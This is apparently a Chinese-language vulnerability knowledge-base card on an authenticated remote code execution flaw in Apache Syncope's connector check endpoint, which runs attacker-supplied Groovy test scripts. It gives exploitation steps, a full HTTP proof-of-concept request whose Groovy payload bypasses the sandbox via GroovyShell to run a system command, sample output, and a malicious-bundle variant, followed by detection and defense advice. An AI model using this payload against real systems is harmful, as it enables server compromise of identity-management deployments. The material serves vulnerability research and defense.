---
id: web-java-component-syncope-connector-script-rce
title: Apache Syncope REST 连接器 testScript 认证后 RCE
type: scenario
domain: web
path: web/java/component
technique: syncope-connector-script-rce
aliases:
- Syncope 连接器 RCE
- Syncope testScript RCE
- SYNCOPE-1907
- ConnId GroovyScriptExecutor
affected_versions: Apache Syncope 4.1.1–4.1.2；ConnId 1.6.1.0–1.6.1.1-SNAPSHOT
tags:
- java
- syncope
- connector
- groovy
- script-engine
- rce
- authenticated
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V2
  verified_at: '2026-11-04T21:42:22+08:00'
  notes: 已对照原文与 4 张截图核对：ConnectorLogic.check -> createConnector().test()、RESTConnector testScript/GROOVY、仅 CONNECTOR_READ、4.1.1 ProcessBuilder、4.1.2 SYNCOPE-1907 GroovyShell、#1418 InvokerHelper、bundle 写 JAR->reload->check 链，均一致。affected_versions 4.1.1–4.1.2 与 ConnId 1.6.1.0–1.6.1.1-SNAPSHOT 与原文时间线一致，设置正确。PoC 未独立执行。
---

## 一句话结论

Apache Syncope 的 `POST /syncope/rest/connectors/check` 会按客户端提交的 `ConnInstanceTO` 实例化连接器并调用 `test()`；内置 `RESTConnector` 的 `testScript` 会被 ConnId 的 `GroovyScriptExecutor` 当作 Groovy 执行。因此一个仅有 `CONNECTOR_READ` 权限的认证用户即可提交脚本实现服务端命令执行：4.1.1 无沙箱可直接 `ProcessBuilder`，4.1.2 的沙箱也可被 `GroovyShell` 或 `InvokerHelper` 绕过。

## 原理

- `ConnectorLogic.check(ConnInstanceTO)` 的实现直接使用客户端传入的配置：

```java
public void check(final ConnInstanceTO connInstanceTO) {
    connectorManager.createConnector(binder.getConnInstance(connInstanceTO)).test();
}
```

- `ConnInstanceTO` 中的 `bundleName`、`connectorName`、`conf` 等字段完全由请求控制；攻击者可以指定内置的脚本化连接器 `net.tirasa.connid.bundles.rest.RESTConnector`。
- `RESTConnector.test()` 读取配置项 `testScript`，交给 `ScriptExecutorFactory.newInstance("GROOVY")` → `GroovyScriptExecutor` 执行。`scriptingLanguage=GROOVY` 与 `reloadScriptOnExecution=true` 等配置也由请求控制。
- 于是 HTTP 层的 `connectors/check` 等价于“提交一段 Groovy 代码并在服务端执行”。命令输出可以拼进异常消息，由 400/500 响应回显。
- 4.1.1 没有任何 Groovy 沙箱，`testScript` 里直接 `new ProcessBuilder(...).start()` 即可 RCE。4.1.2 引入 groovy-sandbox 后，连接器路径走的是 ConnId 自带黑名单（约 100 行），与 Syncope 自身黑名单（253 行）不一致，缺少全部 `GroovyShell` 构造器、`GroovyClassLoader`、`Eval`、`ScriptEngineManager`/`ScriptEngine.eval`，因此可用新解释器绕过；后续 #1418 对齐黑名单后，仍可用 `InvokerHelper` 间接派发绕过。
- 4.1.1 的另一种利用方式是：先用 `testScript` 写入恶意 ConnId bundle JAR 到 `/opt/syncope/bundles/`，再 `POST /connectors/reload` 触发框架扫描加载，最后用恶意连接器配置调用 `check()`；该路径同时暴露了 bundles 目录动态加载缺少完整性校验的问题。

## 触发条件

- 目标为 Apache Syncope 4.1.1 或 4.1.2（ConnId 1.6.1.0/1.6.1.1-SNAPSHOT）；4.1.3 已把文中列出的类加入黑名单，但仍需以实际版本验证。
- 攻击者拥有至少 `CONNECTOR_READ` 权限的账号，能访问 `/syncope/rest/connectors/check`。
- 目标加载了 REST 连接器 bundle `net.tirasa.connid.bundles.rest`。
- 连接器脚本执行路径未被额外禁用或隔离。

## 利用步骤

1. 使用低权限账号认证，确认可访问 `/syncope/rest/connectors/check`。
2. 构造 `ConnInstanceTO`：`location` 指向 bundle 目录，`bundleName` 为 `net.tirasa.connid.bundles.rest`，`connectorName` 为 `net.tirasa.connid.bundles.rest.RESTConnector`，`conf` 中设置 `scriptingLanguage=GROOVY`、`reloadScriptOnExecution=true` 和 `testScript`。
3. 在 `testScript` 中写入 Groovy payload：4.1.1 直接 `ProcessBuilder`；4.1.2 用 `new GroovyShell().evaluate(...)`；#1418 之后用 `InvokerHelper`。
4. 发送 `POST /syncope/rest/connectors/check`，从 400/500 响应的 `elements` 字段读取异常消息中的命令输出。
5. 如需走 bundle 路线：先写恶意 JAR 到 `/opt/syncope/bundles/`，调用 `/connectors/reload` 触发加载，再用恶意连接器配置调用 `check()`。

## PoC

```http
POST /syncope/rest/connectors/check HTTP/1.1
Host: 127.0.0.1:18080
Authorization: Basic <base64(user:pass)>
Content-Type: application/json

{
  "adminRealm": "/",
  "location": "file:/opt/syncope/bundles/",
  "bundleName": "net.tirasa.connid.bundles.rest",
  "connectorName": "net.tirasa.connid.bundles.rest.RESTConnector",
  "version": "1.1.1",
  "displayName": "sandbox-bypass",
  "conf": [
    { "schema": { "name": "baseAddress", "type": "java.lang.String" }, "values": [ "http://127.0.0.1:1" ] },
    { "schema": { "name": "scriptingLanguage", "type": "java.lang.String" }, "values": [ "GROOVY" ] },
    { "schema": { "name": "reloadScriptOnExecution", "type": "boolean" }, "values": [ true ] },
    {
      "schema": { "name": "testScript", "type": "java.lang.String" },
      "values": [
        "new groovy.lang.GroovyShell().evaluate('def p = Runtime.getRuntime().exec(\"id\"); p.waitFor(); throw new RuntimeException(\"RCE:\" + p.getInputStream().text)')"
      ]
    }
  ]
}
```

```text
HTTP/1.1 400 Bad Request
{"status":400,"type":"ConnectorException","elements":["RuntimeException: RCE:uid=100(syncope) gid=101(syncope) groups=101(syncope)\n"]}
```

4.1.1 无沙箱时可将 `testScript` 换成直接 `new ProcessBuilder(["sh","-c","id"]).start()`；黑名单对齐后改用 `InvokerHelper` payload（见关联卡）。PoC 未在目标环境执行。

## 变体与关联

- 变体：4.1.1 的“写 bundle JAR → `connectors/reload` → 恶意连接器 `test()`”三步链，利用的是 bundles 目录无签名/白名单校验。
- 变体：4.1.2 + #1418 之后，用 `org.codehaus.groovy.runtime.InvokerHelper` 间接调用 `Runtime.getRuntime`/`exec`，绕过静态签名黑名单；同一 payload 在 Flowable BPMN 的 groovy scriptTask 中同样有效。
- 关联：[[binary-pwn-sandbox-escape-groovy-interpreter-reinstantiation]]（`GroovyShell`/`GroovyClassLoader`/`Eval`/`ScriptEngine` 绕过原理）；[[binary-pwn-sandbox-escape-groovy-invokerhelper-indirect-dispatch]]（`InvokerHelper` 绕过原理）；[[binary-pwn-sandbox-escape-groovy-reflection-blacklist-gaps]]（弱黑名单阶段的反射/文件写探测）。
- 关联：[[pentest-persistence-java-webroot-discovery-jsp-drop]]（Java 应用写 Web 目录落 JSP 的通用持久化思路）。

## 检测与防御

- 检测：审计 `/syncope/rest/connectors/check` 与 `/connectors/reload` 的调用，重点关注请求中 `testScript` 非空、`scriptingLanguage=GROOVY`、`reloadScriptOnExecution=true`、`bundleName`/`connectorName` 指向脚本化连接器。
- 检测：应用日志/响应中出现 `ConnectorException` 且消息含命令输出、`RCE:` 等自定义前缀；`bundles` 目录出现新增 JAR；进程创建记录中出现 `sh -c`、`id` 等异常命令。
- 防御：最小化 `CONNECTOR_READ` 权限，连接器管理仅授予可信管理员；对连接器配置做字段白名单，禁止客户端提交脚本类连接器或任意 `testScript`。
- 防御：升级到修复版本并确认黑名单/沙箱已覆盖解释器与 `InvokerHelper`；更根本的是对不可信脚本使用独立 JVM/容器隔离，禁止脚本执行子进程。
- 防御：`bundles` 目录做完整性校验与签名，运行期禁止写入；对 bundle reload 操作做审批与审计；核心身份管理系统不直接暴露公网。
